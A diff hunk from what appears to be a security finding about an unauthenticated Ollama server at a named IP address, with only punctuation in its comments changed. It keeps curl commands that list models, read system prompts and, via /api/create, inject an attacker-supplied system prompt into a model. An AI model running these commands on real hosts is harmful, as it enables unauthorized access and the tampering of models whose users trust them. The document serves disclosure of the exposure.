@@ -102,13 +102,13 @@ GET /ollama/api/version → {"version":"0.17.5"}  # backend Ollama version
 Raw Ollama port 11434 is internet-accessible. Open WebUI authentication provides no protection.
 
 ```bash
-# Full model listing — no auth
+# Full model listing - no auth
 curl http://204.186.103.4:11434/api/tags
 
-# System prompt inspection — no auth
+# System prompt inspection - no auth
 curl http://204.186.103.4:11434/api/show -d '{"model":"llama3.2:1b"}'
 
-# Model injection — no auth (CVE-2025-63389)
+# Model injection - no auth (CVE-2025-63389)
 curl -X POST http://204.186.103.4:11434/api/create \
   -d '{"model":"llama3.2:1b","from":"llama3.2:1b","system":"[attacker prompt]"}'
 ```
